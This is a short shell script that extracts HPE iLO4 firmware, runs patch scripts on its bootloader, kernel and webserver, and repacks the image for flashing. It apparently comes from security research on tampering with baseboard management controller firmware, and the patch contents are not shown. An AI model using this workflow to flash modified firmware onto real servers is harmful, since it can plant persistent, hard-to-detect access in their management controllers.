#!/bin/bash

if [ $# -ne 1 ]; then
    echo "usage: $0 <firmware.bin>"
    exit 1
fi

DIR=`dirname $0`
FIRMWARE=$1

rm -rf outdir

python2.7 $DIR/ilo4_extract.py $FIRMWARE outdir
if [ $? != 0 ];
then
    echo "ERROR: ilo4_extract.py failed"
    exit 1
fi
python2.7 $DIR/patch_bootloader_250.py outdir/bootloader.bin
if [ $? != 0 ];
then
    echo "ERROR: patch_bootloader_250.py failed"
    exit 1
fi
python2.7 $DIR/patch_kernel_250.py outdir/kernel_main.bin
if [ $? != 0 ];
then
    echo "ERROR: patch_kernel_250.py failed"
    exit 1
fi
python2.7 $DIR/patch_webserver_250.py outdir/elf.bin
if [ $? != 0 ];
then
    echo "ERROR: patch_webserver_250.py failed"
    exit 1
fi

python2.7 $DIR/ilo4_repack.py $FIRMWARE outdir/firmware.map outdir/elf.bin.patched outdir/kernel_main.bin.patched outdir/bootloader.bin.patched
if [ $? != 0 ];
then
    echo "ERROR: ilo4_repack.py failed"
    exit 1
fi

echo "[+] Firmware ready to be flashed"
